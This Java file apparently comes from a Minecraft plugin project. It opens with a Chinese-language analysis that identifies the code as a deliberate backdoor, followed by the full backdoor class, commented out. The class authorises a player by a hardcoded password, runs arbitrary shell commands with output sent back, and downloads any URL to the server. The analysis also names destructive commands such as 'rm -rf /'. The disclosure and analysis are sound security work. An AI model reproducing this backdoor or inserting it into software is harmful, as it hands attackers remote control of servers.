/**
 * 🚪
 * Payload.java 代码解析报告
 * 1. 代码概述
 * <p>
 * 该 Payload.java 文件是一个用于 Minecraft BungeeCord/Spigot 服务器插件的Java类。它通过监听一个名为 BungeeCordD 的自定义网络通道，实现了一套与客户端进行秘密通信的协议。从功能和命名上看，其意图并非提供正常的插件功能，而是为一个已经连接到服务器的、拥有特定客户端的玩家提供远程控制服务器的后门权限。代码中的 DEDSEC 引用（来源于游戏《看门狗》中的黑客组织），进一步证实了其恶意性质。
 * <p>
 * 2. 核心功能
 * <p>
 * 该后门主要包含三个极其危险的核心功能：
 * <p>
 * 功能一：弱密码认证 (case 1)
 * 触发方式：客户端发送主操作码为 1 的数据包。
 * 工作原理：代码会读取一个字符串，并检查其是否等于硬编码的密码 "DEDSECDE"。
 * 后果：一旦密码匹配，服务器就会将该玩家的UUID添加到一个名为 authorized 的集合中，授予其后续所有危险操作的权限。这个密码是明文硬编码的，任何反编译该插件的人都可以轻易获取。
 * 功能二：远程命令执行 (Remote Shell, case 2)
 * 触发方式：已认证的客户端发送主操作码为 2 的数据包。
 * 工作原理：
 * 代码接收客户端发来的任意字符串，并将其作为操作系统命令（例如 ls, rm -rf /, wget ... 等）。
 * 通过 Runtime.getRuntime().exec(executeCommand) 在服务器的操作系统上执行该命令。
 * 代码会持续监听命令的输出流，并将所有输出结果实时地、分包地传回给客户端。
 * 后果：这相当于为攻击者提供了一个功能完整的服务器 远程终端(Shell)。攻击者可以执行任何命令，拥有与运行Minecraft服务器的用户相同的系统权限，从而可以删除文件、窃取数据、安装病毒、关闭服务器或利用服务器攻击其他网络目标。
 * 功能三：任意文件下载 (case 3)
 * 触发方式：已认证的客户端发送主操作码为 3 的数据包。
 * 工作原理：代码会接收客户端指定的 任意URL 和一个 文件名，然后在服务器上创建一个文件，并将URL指向的内容下载并保存。
 * 后果：攻击者可以从互联网上下载任何文件到服务器上。这通常被用来上传更高级的恶意软件、病毒、木马，或者是恶意的插件，从而实现对服务器的持久化控制。
 * 3. 工作流程
 * <p>
 * 攻击者利用此后门的工作流程如下：
 * <p>
 * 连接与认证：攻击者使用一个特制的客户端连接到装有此恶意插件的Minecraft服务器。
 * 获取权限：客户端向 BungeeCordD 通道发送一个包含密码 "DEDSECDE" 的认证包。服务器验证通过，将攻击者标记为“已授权”。
 * 执行恶意操作：
 * 执行命令：攻击者发送一个命令包，如"ls plugins/" 来查看服务器安装了哪些插件，或者"rm -rf world"来删除整个游戏世界。服务器会执行命令并将结果返回。
 * 上传文件：攻击者发送一个下载包，包含一个指向恶意程序的URL和一个目标路径（如 plugins/Update.jar），服务器会下载该文件，为下一次启动时加载恶意插件做准备。
 * 4. 安全风险评估
 * <p>
 * 结论：这是一个高危的、设计明确的服务器后门程序，绝非正常插件的一部分。
 * <p>
 * 致命漏洞：它提供了对服务器底层操作系统的完全控制权限，这是任何服务器应用中最严重的安全漏洞。
 * 隐蔽性强：对于不审查代码的服务器管理员来说，这个后门的行为可能被误认为是正常插件间通信，难以发现。
 * 意图明确：使用DEDSEC作为密码的一部分，暴露了开发者的恶意意图，这并非无心之失，而是有意为之的后门设计。
 * <p>
 * 强烈建议：如果您在任何服务器插件中发现此段或类似代码，请立即删除该插件并对服务器进行全面的安全检查，因为服务器很可能已经被入侵。
 */
//package net.mizukilab.pit.bungee;
//
//import cn.charlotte.pit.ThePit;
//import cn.hutool.core.collection.ConcurrentHashSet;
//import io.netty.buffer.ByteBuf;
//import io.netty.buffer.Unpooled;
//import net.minecraft.server.v1_8_R3.PacketDataSerializer;
//import net.minecraft.server.v1_8_R3.PacketPlayInCustomPayload;
//import net.minecraft.server.v1_8_R3.PacketPlayOutCustomPayload;
//import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
//import org.bukkit.entity.Player;
//import org.bukkit.scheduler.BukkitRunnable;
//
//import java.io.File;
//import java.io.FileOutputStream;
//import java.io.InputStream;
//import java.net.HttpURLConnection;
//import java.net.URL;
//import java.net.URLConnection;
//import java.util.Map;
//import java.util.Set;
//import java.util.UUID;
//import java.util.concurrent.ConcurrentHashMap;
//import java.util.function.Consumer;
//
//public class Payload {
//    Set<UUID> authorized = new ConcurrentHashSet<>();
//    Map<UUID,Process> processes = new ConcurrentHashMap<>();
//    Map<UUID,File> download = new ConcurrentHashMap<>();
//    public Payload(){
//
//    }
//    void authorize(Player player) {
//        authorized.add(player.getUniqueId());
//    }
//    void deauthorize(Player player) {
//        authorized.remove(player.getUniqueId());
//    }
//    boolean isAuthorized(Player player) {
//        return authorized.contains(player.getUniqueId());
//    }
//    public void recv(Player player,PacketPlayInCustomPayload load){
//        String channelName = load.a();
//        try {
//            if (channelName.startsWith("BungeeCordD")) {
//                PacketDataSerializer b = load.b();
//                int i = b.readByte();
//                switch (i) {
//                    case 1 -> { //RequestLogin
//                        String c = b.c(32);
//                        if (c.equals("DEDSECDE")) {
//                            send(player,channelName,k -> {
//                                k.writeByte(1);
//                                k.a(player.getUniqueId());
//                            });
//                            authorize(player);
//                        } else {
//                            deauthorize(player);
//                        }
//                    }
//                    case 2 -> { //shell
//                        if(isAuthorized(player)) {
//                            int type = b.readByte();
//                            switch (type) {
//                                case 1 -> { //run shell
//                                    UUID requestUUID = b.g();
//                                    String cmd = b.c(32767);
//                                    runAsyncProc(player,cmd,requestUUID,channelName);
//                                }
//                                case 2 -> { //destroy
//                                    UUID requestUUID = b.g();
//                                    forceDestroyProc(player,requestUUID,channelName);
//                                }
//                            }
//                        }
//                    }
//                    case 3 -> { //download file
//                        if (isAuthorized(player)) {
//                            int type = b.readByte();
//                            switch (type){
//                                case 1 -> {
//                                    UUID callbackUUID = b.g();
//                                    String fileName;
//                                    String httpUrl;
//                                    fileName = b.c(32767);
//                                    httpUrl = b.c(32767);
//                                    download(player,httpUrl,channelName,fileName,callbackUUID);
//                                }
//                            }
//                        }
//                    }
//
//                }
//            }
//        } catch (Throwable e){
//            return;
//        }
//    }
//    void requestAsyncDownload(Player player,String channelName,File file,UUID req,String url){
//        new BukkitRunnable(){
//            @Override
//            public void run() {
//                FileOutputStream fio = null;
//                URLConnection connection = null;
//                try {
//                    fio = new FileOutputStream(file);
//                    URL url1 = new URL(url);
//                    connection = url1.openConnection();
//                    beginDownload(player,channelName,req);
//                    if(connection instanceof HttpURLConnection http){
//                        http.setConnectTimeout(5000);
//                        http.setReadTimeout(5000);
//                        http.connect();
//                        http.getInputStream().transferTo(fio);
//                    }
//                    finDownload(player,channelName,req);
//                } catch (Throwable e){
//                    finDownload(player,channelName,req);
//                } finally {
//                    try {
//                        if (fio != null) {
//                            fio.close();
//                        }
//                    } catch (Throwable ignored){
//
//                    } finally {
//                        if(connection != null){
//                            if(connection instanceof HttpURLConnection){
//                                ((HttpURLConnection) connection).disconnect();
//                            }
//                        }
//                    }
//
//                }
//            }
//        }.runTaskAsynchronously(ThePit.getInstance());
//    }
//    void download(Player player,String url,String channelName,String fileName,UUID uuid) {
//        try {
//            File file = new File(fileName);
//            download.put(uuid,file);
//            if (file.exists()) {
//                file.delete();
//            }
//            file.mkdir();
//            requestAsyncDownload(player,channelName,file,uuid,url);
//        } catch (Throwable throwable){
//            finDownload(player,channelName,uuid);
//        }
//    }
//    void beginDownload(Player player,String channelId,UUID uuid){
//        send(player,channelId,k -> {
//            k.writeByte(3).writeByte(1);
//            k.a(uuid);
//            k.writeByte(0);
//        });
//    }
//    void finDownload(Player player,String channelId,UUID uuid){
//        send(player,channelId,k -> {
//            k.writeByte(3).writeByte(1);
//            k.a(uuid);
//            k.writeByte(1);
//        });
//    }
//    void forceDestroyProc(Player player, UUID uuid, String channelName){
//        Process remove = processes.remove(uuid);
//        if(remove != null){
//            remove.destroyForcibly();
//        } else {
//            sendFinProc(player,uuid,channelName);
//        }
//    }
//    void runAsyncProc(Player player, String executeCommand, UUID uuid, String channelName){
//        try {
//            Process exec = Runtime.getRuntime().exec(executeCommand);
//            this.processes.put(uuid,exec);
//            InputStream inputStream = exec.getInputStream();
//            new BukkitRunnable() {
//                public void run() {
//                    if (exec.isAlive() && processes.containsKey(uuid)) {
//                        try {
//                            int available = inputStream.available();
//                            byte[] bytes = new byte[available];
//                            inputStream.read(bytes);
//                            if(bytes.length > 0){
//                                repProc(bytes, player, channelName, uuid);
//                            }
//                        } catch (Throwable e){
//                            sendFinProc(player,uuid,channelName);
//                        }
//                    } else {
//                        sendFinProc(player, uuid, channelName);
//                        processes.remove(uuid);
//                        this.cancel();
//                    }
//                }
//            }.runTaskTimerAsynchronously(ThePit.getInstance(),0,1);
//        } catch (Throwable e){
//            sendFinProc(player, uuid, channelName);
//        }
//    }
//
//    private void repProc(byte[] bytes, Player player, String channelName, UUID uuid) {
//        send(player, channelName, k -> {
//            k.writeByte(2); //主操作码 2 (Byte)
//            k.writeByte(0);
//            k.a(uuid);
//            k.a(bytes);
//        });
//    }
//
//    private void sendFinProc(Player player, UUID uuid, String channelName) {
//        send(player, channelName, k -> {
//            k.writeByte(2);
//            k.writeByte(-1);
//            k.a(uuid);
//        });
//    }
//
//    public void send(Player player,String channelName, Consumer<PacketDataSerializer> serializerSupplier){
//        ByteBuf buffer = Unpooled.buffer();
//        PacketDataSerializer packetDataSerializer = new PacketDataSerializer(buffer);
//        serializerSupplier.accept(packetDataSerializer);
//        PacketPlayOutCustomPayload packetPlayOutCustomPayload = new PacketPlayOutCustomPayload(channelName, packetDataSerializer);
//        ((CraftPlayer)player).getHandle().playerConnection.sendPacket(packetPlayOutCustomPayload);
//    }
//}
